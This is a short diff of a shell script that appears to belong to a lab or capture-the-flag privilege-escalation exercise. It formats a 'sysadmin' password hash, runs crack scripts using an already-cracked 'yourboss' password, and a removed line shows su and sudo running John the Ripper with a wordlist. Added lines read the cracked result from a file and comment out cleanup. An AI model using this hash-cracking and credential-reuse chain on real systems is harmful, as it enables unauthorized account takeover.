@@ -20,11 +20,14 @@
 
 # Format sysadmin's password hash
  ./format_password.py "$sysadmin_hash" > temp_hash.txt
-
  ./auth.sh crack_sysadmin.sh $yourboss_cracked
-#./auth.sh "su yourboss -c \"echo $yourboss_cracked | sudo -S john --wordlist=/usr/share/dict/american-english-small temp_hash.txt > out.txt\"" $yourboss_cracked
+ ./auth.sh show_sysadmin.sh $yourboss_cracked
+# sysadmin_cracked=$(</tmp/cracked_sysadmin1.txt)
+# /home/tempworker/cracked_sysadmin1.txt
+# echo $sysadmin_cracked
 
 # Cleanup 
- rm temp.txt
- rm temp_hash.txt
+# rm temp.txt
+# rm temp_hash.txt
+# ./auth.sh cleanup.sh $yourboss_cracked
 
